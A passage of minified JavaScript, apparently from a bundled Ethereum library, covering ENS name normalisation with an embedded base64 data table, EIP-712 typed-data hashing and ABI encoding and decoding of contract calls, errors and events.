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"))}const rp=lK(),hK=new Set(ff(rp)),dK=new Set(ff(rp)),fK=sK(rp),pK=uK(rp),MA=45,BA=95;function Bx(t){return GV(t)}function gK(t){return t.filter(e=>e!=65039)}function Ux(t){for(let e of t.split(".")){let r=Bx(e);try{for(let n=r.lastIndexOf(BA)-1;n>=0;n--)if(r[n]!==BA)throw new Error("underscore only allowed at start");if(r.length>=4&&r.every(n=>n<128)&&r[2]===MA&&r[3]===MA)throw new Error("invalid label extension")}catch(n){throw new Error(`Invalid label "${e}": ${n.message}`)}}return t}function mK(t){return Ux(yK(t,gK))}function yK(t,e){let r=Bx(t).reverse(),n=[];for(;r.length;){let i=bK(r);if(i){n.push(...e(i));continue}let s=r.pop();if(hK.has(s)){n.push(s);continue}if(dK.has(s))continue;let o=fK[s];if(o){n.push(...o);continue}throw new Error(`Disallowed codepoint: 0x${s.toString(16).toUpperCase()}`)}return Ux(wK(String.fromCodePoint(...n)))}function wK(t){return t.normalize("NFC")}function bK(t,e){var r;let n=pK,i,s,o=[],a=t.length;for(;a;){let c=t[--a];if(n=(r=n.branches.find(u=>u.set.has(c)))===null||r===void 0?void 0:r.node,!n)break;if(n.save)s=c;else if(n.check&&c===s)break;o.push(c),n.fe0f&&(o.push(65039),a>0&&t[a-1]==65039&&a--),n.valid&&(i=o.slice(),n.valid==2&&i.splice(1,1),t.length=a)}return i}const vK=new H(Rx),$x=new Uint8Array(32);$x.fill(0);function UA(t){if(t.length===0)throw new Error("invalid ENS name; empty component");return t}function Lx(t){const e=Gi(mK(t)),r=[];if(t.length===0)return r;let n=0;for(let i=0;i<e.length;i++)e[i]===46&&(r.push(UA(e.slice(n,i))),n=i+1);if(n>=e.length)throw new Error("invalid ENS name; empty component");return r.push(UA(e.slice(n))),r}function Ed(t){typeof t!="string"&&vK.throwArgumentError("invalid ENS name; not a string","name",t);let e=$x;const r=Lx(t);for(;r.length;)e=fr(Pn([e,fr(r.pop())]));return we(e)}function EK(t){return we(Pn(Lx(t).map(e=>{if(e.length>63)throw new Error("invalid DNS encoded entry; length exceeds 63 bytes");const r=new Uint8Array(e.length+1);return r.set(e,1),r[0]=r.length-1,r})))+"00"}var AK=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const Yt=new H(Rx),Fx=new Uint8Array(32);Fx.fill(0);const _K=ne.from(-1),jx=ne.from(0),qx=ne.from(1),CK=ne.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");function IK(t){const e=ve(t),r=e.length%32;return r?dn([e,Fx.slice(r)]):we(e)}const xK=Vt(qx.toHexString(),32),SK=Vt(jx.toHexString(),32),$A={name:"string",version:"string",chainId:"uint256",verifyingContract:"address",salt:"bytes32"},Gg=["name","version","chainId","verifyingContract","salt"];function LA(t){return function(e){return typeof e!="string"&&Yt.throwArgumentError(`invalid domain value for ${JSON.stringify(t)}`,`domain.${t}`,e),e}}const NK={name:LA("name"),version:LA("version"),chainId:function(t){try{return ne.from(t).toString()}catch{}return Yt.throwArgumentError('invalid domain value for "chainId"',"domain.chainId",t)},verifyingContract:function(t){try{return Mr(t).toLowerCase()}catch{}return Yt.throwArgumentError('invalid domain value "verifyingContract"',"domain.verifyingContract",t)},salt:function(t){try{const e=ve(t);if(e.length!==32)throw new Error("bad length");return we(e)}catch{}return Yt.throwArgumentError('invalid domain value "salt"',"domain.salt",t)}};function Vg(t){{const e=t.match(/^(u?)int(\d*)$/);if(e){const r=e[1]==="",n=parseInt(e[2]||"256");(n%8!==0||n>256||e[2]&&e[2]!==String(n))&&Yt.throwArgumentError("invalid numeric width","type",t);const i=CK.mask(r?n-1:n),s=r?i.add(qx).mul(_K):jx;return function(o){const a=ne.from(o);return(a.lt(s)||a.gt(i))&&Yt.throwArgumentError(`value out-of-bounds for ${t}`,"value",o),Vt(a.toTwos(256).toHexString(),32)}}}{const e=t.match(/^bytes(\d+)$/);if(e){const r=parseInt(e[1]);return(r===0||r>32||e[1]!==String(r))&&Yt.throwArgumentError("invalid bytes width","type",t),function(n){return ve(n).length!==r&&Yt.throwArgumentError(`invalid length for ${t}`,"value",n),IK(n)}}}switch(t){case"address":return function(e){return Vt(Mr(e),32)};case"bool":return function(e){return e?xK:SK};case"bytes":return function(e){return fr(e)};case"string":return function(e){return nc(e)}}return null}function FA(t,e){return`${t}(${e.map(({name:r,type:n})=>n+" "+r).join(",")})`}class _n{constructor(e){X(this,"types",Object.freeze(Es(e))),X(this,"_encoderCache",{}),X(this,"_types",{});const r={},n={},i={};Object.keys(e).forEach(a=>{r[a]={},n[a]=[],i[a]={}});for(const a in e){const c={};e[a].forEach(u=>{c[u.name]&&Yt.throwArgumentError(`duplicate variable name ${JSON.stringify(u.name)} in ${JSON.stringify(a)}`,"types",e),c[u.name]=!0;const l=u.type.match(/^([^\x5b]*)(\x5b|$)/)[1];l===a&&Yt.throwArgumentError(`circular type reference to ${JSON.stringify(l)}`,"types",e),!Vg(l)&&(n[l]||Yt.throwArgumentError(`unknown type ${JSON.stringify(l)}`,"types",e),n[l].push(a),r[a][l]=!0)})}const s=Object.keys(n).filter(a=>n[a].length===0);s.length===0?Yt.throwArgumentError("missing primary type","types",e):s.length>1&&Yt.throwArgumentError(`ambiguous primary types or unused types: ${s.map(a=>JSON.stringify(a)).join(", ")}`,"types",e),X(this,"primaryType",s[0]);function o(a,c){c[a]&&Yt.throwArgumentError(`circular type reference to ${JSON.stringify(a)}`,"types",e),c[a]=!0,Object.keys(r[a]).forEach(u=>{n[u]&&(o(u,c),Object.keys(c).forEach(l=>{i[l][u]=!0}))}),delete c[a]}o(this.primaryType,{});for(const a in i){const c=Object.keys(i[a]);c.sort(),this._types[a]=FA(a,e[a])+c.map(u=>FA(u,e[u])).join("")}}getEncoder(e){let r=this._encoderCache[e];return r||(r=this._encoderCache[e]=this._getEncoder(e)),r}_getEncoder(e){{const i=Vg(e);if(i)return i}const r=e.match(/^(.*)(\x5b(\d*)\x5d)$/);if(r){const i=r[1],s=this.getEncoder(i),o=parseInt(r[3]);return a=>{o>=0&&a.length!==o&&Yt.throwArgumentError("array length mismatch; expected length ${ arrayLength }","value",a);let c=a.map(s);return this._types[i]&&(c=c.map(fr)),fr(dn(c))}}const n=this.types[e];if(n){const i=nc(this._types[e]);return s=>{const o=n.map(({name:a,type:c})=>{const u=this.getEncoder(c)(s[a]);return this._types[c]?fr(u):u});return o.unshift(i),dn(o)}}return Yt.throwArgumentError(`unknown type: ${e}`,"type",e)}encodeType(e){const r=this._types[e];return r||Yt.throwArgumentError(`unknown type: ${JSON.stringify(e)}`,"name",e),r}encodeData(e,r){return this.getEncoder(e)(r)}hashStruct(e,r){return fr(this.encodeData(e,r))}encode(e){return this.encodeData(this.primaryType,e)}hash(e){return this.hashStruct(this.primaryType,e)}_visit(e,r,n){if(Vg(e))return n(e,r);const i=e.match(/^(.*)(\x5b(\d*)\x5d)$/);if(i){const o=i[1],a=parseInt(i[3]);return a>=0&&r.length!==a&&Yt.throwArgumentError("array length mismatch; expected length ${ arrayLength }","value",r),r.map(c=>this._visit(o,c,n))}const s=this.types[e];return s?s.reduce((o,{name:a,type:c})=>(o[a]=this._visit(c,r[a],n),o),{}):Yt.throwArgumentError(`unknown type: ${e}`,"type",e)}visit(e,r){return this._visit(this.primaryType,e,r)}static from(e){return new _n(e)}static getPrimaryType(e){return _n.from(e).primaryType}static hashStruct(e,r,n){return _n.from(r).hashStruct(e,n)}static hashDomain(e){const r=[];for(const n in e){const i=$A[n];i||Yt.throwArgumentError(`invalid typed-data domain key: ${JSON.stringify(n)}`,"domain",e),r.push({name:n,type:i})}return r.sort((n,i)=>Gg.indexOf(n.name)-Gg.indexOf(i.name)),_n.hashStruct("EIP712Domain",{EIP712Domain:r},e)}static encode(e,r,n){return dn(["0x1901",_n.hashDomain(e),_n.from(r).hash(n)])}static hash(e,r,n){return fr(_n.encode(e,r,n))}static resolveNames(e,r,n,i){return AK(this,void 0,void 0,function*(){e=pr(e);const s={};e.verifyingContract&&!Ye(e.verifyingContract,20)&&(s[e.verifyingContract]="0x");const o=_n.from(r);o.visit(n,(a,c)=>(a==="address"&&!Ye(c,20)&&(s[c]="0x"),c));for(const a in s)s[a]=yield i(a);return e.verifyingContract&&s[e.verifyingContract]&&(e.verifyingContract=s[e.verifyingContract]),n=o.visit(n,(a,c)=>a==="address"&&s[c]?s[c]:c),{domain:e,value:n}})}static getPayload(e,r,n){_n.hashDomain(e);const i={},s=[];Gg.forEach(c=>{const u=e[c];u!=null&&(i[c]=NK[c](u),s.push({name:c,type:$A[c]}))});const o=_n.from(r),a=pr(r);return a.EIP712Domain?Yt.throwArgumentError("types must not contain EIP712Domain type","types.EIP712Domain",r):a.EIP712Domain=s,o.encode(n),{types:a,domain:i,primaryType:o.primaryType,message:o.visit(n,(c,u)=>{if(c.match(/^bytes(\d*)/))return we(ve(u));if(c.match(/^u?int/))return ne.from(u).toString();switch(c){case"address":return u.toLowerCase();case"bool":return!!u;case"string":return typeof u!="string"&&Yt.throwArgumentError("invalid string","value",u),u}return Yt.throwArgumentError("unsupported type","type",c)})}}}const Qt=new H(yh);class TK extends mh{}class PK extends mh{}class RK extends mh{}class U0 extends mh{static isIndexed(e){return!!(e&&e._isIndexed)}}const OK={"0x08c379a0":{signature:"Error(string)",name:"Error",inputs:["string"],reason:!0},"0x4e487b71":{signature:"Panic(uint256)",name:"Panic",inputs:["uint256"]}};function jA(t,e){const r=new Error(`deferred error during ABI decoding triggered accessing ${t}`);return r.error=e,r}class qA{constructor(e){let r=[];typeof e=="string"?r=JSON.parse(e):r=e,X(this,"fragments",r.map(n=>ds.from(n)).filter(n=>n!=null)),X(this,"_abiCoder",Bi(new.target,"getAbiCoder")()),X(this,"functions",{}),X(this,"errors",{}),X(this,"events",{}),X(this,"structs",{}),this.fragments.forEach(n=>{let i=null;switch(n.type){case"constructor":if(this.deploy){Qt.warn("duplicate definition - constructor");return}X(this,"deploy",n);return;case"function":i=this.functions;break;case"event":i=this.events;break;case"error":i=this.errors;break;default:return}let s=n.format();if(i[s]){Qt.warn("duplicate definition - "+s);return}i[s]=n}),this.deploy||X(this,"deploy",Di.from({payable:!1,type:"constructor"})),X(this,"_isInterface",!0)}format(e){e||(e=Ke.full),e===Ke.sighash&&Qt.throwArgumentError("interface does not support formatting sighash","format",e);const r=this.fragments.map(n=>n.format(e));return e===Ke.json?JSON.stringify(r.map(n=>JSON.parse(n))):r}static getAbiCoder(){return JV}static getAddress(e){return Mr(e)}static getSighash(e){return qr(nc(e.format()),0,4)}static getEventTopic(e){return nc(e.format())}getFunction(e){if(Ye(e)){for(const n in this.functions)if(e===this.getSighash(n))return this.functions[n];Qt.throwArgumentError("no matching function","sighash",e)}if(e.indexOf("(")===-1){const n=e.trim(),i=Object.keys(this.functions).filter(s=>s.split("(")[0]===n);return i.length===0?Qt.throwArgumentError("no matching function","name",n):i.length>1&&Qt.throwArgumentError("multiple matching functions","name",n),this.functions[i[0]]}const r=this.functions[Mi.fromString(e).format()];return r||Qt.throwArgumentError("no matching function","signature",e),r}getEvent(e){if(Ye(e)){const n=e.toLowerCase();for(const i in this.events)if(n===this.getEventTopic(i))return this.events[i];Qt.throwArgumentError("no matching event","topichash",n)}if(e.indexOf("(")===-1){const n=e.trim(),i=Object.keys(this.events).filter(s=>s.split("(")[0]===n);return i.length===0?Qt.throwArgumentError("no matching event","name",n):i.length>1&&Qt.throwArgumentError("multiple matching events","name",n),this.events[i[0]]}const r=this.events[ls.fromString(e).format()];return r||Qt.throwArgumentError("no matching event","signature",e),r}getError(e){if(Ye(e)){const n=Bi(this.constructor,"getSighash");for(const i in this.errors){const s=this.errors[i];if(e===n(s))return this.errors[i]}Qt.throwArgumentError("no matching error","sighash",e)}if(e.indexOf("(")===-1){const n=e.trim(),i=Object.keys(this.errors).filter(s=>s.split("(")[0]===n);return i.length===0?Qt.throwArgumentError("no matching error","name",n):i.length>1&&Qt.throwArgumentError("multiple matching errors","name",n),this.errors[i[0]]}const r=this.errors[Mi.fromString(e).format()];return r||Qt.throwArgumentError("no matching error","signature",e),r}getSighash(e){if(typeof e=="string")try{e=this.getFunction(e)}catch(r){try{e=this.getError(e)}catch{throw r}}return Bi(this.constructor,"getSighash")(e)}getEventTopic(e){return typeof e=="string"&&(e=this.getEvent(e)),Bi(this.constructor,"getEventTopic")(e)}_decodeParams(e,r){return this._abiCoder.decode(e,r)}_encodeParams(e,r){return this._abiCoder.encode(e,r)}encodeDeploy(e){return this._encodeParams(this.deploy.inputs,e||[])}decodeErrorResult(e,r){typeof e=="string"&&(e=this.getError(e));const n=ve(r);return we(n.slice(0,4))!==this.getSighash(e)&&Qt.throwArgumentError(`data signature does not match error ${e.name}.`,"data",we(n)),this._decodeParams(e.inputs,n.slice(4))}encodeErrorResult(e,r){return typeof e=="string"&&(e=this.getError(e)),we(Pn([this.getSighash(e),this._encodeParams(e.inputs,r||[])]))}decodeFunctionData(e,r){typeof e=="string"&&(e=this.getFunction(e));const n=ve(r);return we(n.slice(0,4))!==this.getSighash(e)&&Qt.throwArgumentError(`data signature does not match function ${e.name}.`,"data",we(n)),this._decodeParams(e.inputs,n.slice(4))}encodeFunctionData(e,r){return typeof e=="string"&&(e=this.getFunction(e)),we(Pn([this.getSighash(e),this._encodeParams(e.inputs,r||[])]))}decodeFunctionResult(e,r){typeof e=="string"&&(e=this.getFunction(e));let n=ve(r),i=null,s="",o=null,a=null,c=null;switch(n.length%this._abiCoder._getWordSize()){case 0:try{return this._abiCoder.decode(e.outputs,n)}catch{}break;case 4:{const u=we(n.slice(0,4)),l=OK[u];if(l)o=this._abiCoder.decode(l.inputs,n.slice(4)),a=l.name,c=l.signature,l.reason&&(i=o[0]),a==="Error"?s=`; VM Exception while processing transaction: reverted with reason string ${JSON.stringify(o[0])}`:a==="Panic"&&(s=`; VM Exception while processing transaction: reverted with panic code ${o[0]}`);else try{const h=this.getError(u);o=this._abiCoder.decode(h.inputs,n.slice(4)),a=h.name,c=h.format()}catch{}break}}return Qt.throwError("call revert exception"+s,H.errors.CALL_EXCEPTION,{method:e.format(),data:we(r),errorArgs:o,errorName:a,errorSignature:c,reason:i})}encodeFunctionResult(e,r){return typeof e=="string"&&(e=this.getFunction(e)),we(this._abiCoder.encode(e.outputs,r||[]))}encodeFilterTopics(e,r){typeof e=="string"&&(e=this.getEvent(e)),r.length>e.inputs.length&&Qt.throwError("too many arguments for "+e.format(),H.errors.UNEXPECTED_ARGUMENT,{argument:"values",value:r});let n=[];e.anonymous||n.push(this.getEventTopic(e));const i=(s,o)=>s.type==="string"?nc(o):s.type==="bytes"?fr(we(o)):(s.type==="bool"&&typeof o=="boolean"&&(o=o?"0x01":"0x00"),s.type.match(/^u?int/)&&(o=ne.from(o).toHexString()),s.type==="address"&&this._abiCoder.encode(["address"],[o]),Vt(we(o),32));for(r.forEach((s,o)=>{let 